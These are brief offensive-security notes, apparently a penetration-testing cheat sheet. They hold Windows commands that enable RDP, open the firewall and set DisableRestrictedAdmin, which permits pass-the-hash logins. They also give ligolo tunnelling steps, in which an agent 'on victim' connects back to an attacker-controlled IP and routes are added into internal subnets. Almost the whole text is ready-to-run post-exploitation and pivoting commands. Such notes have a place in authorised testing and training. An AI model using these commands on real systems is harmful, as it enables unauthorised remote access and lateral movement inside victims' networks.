Enable RDP
```
shell reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

shell netsh advfirewall firewall set rule group="remote desktop" new enable=Yes




shell reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

ligolo

```
On Kali
sudo ./proxy -selfcert

sudo ip route add 192.168.211.0/24 dev ligolo
sudo ip route add 172.16.211.0/24 dev ligolo



On victim : 
./agent -connect 192.168.45.195:11601 -ignore-cert


```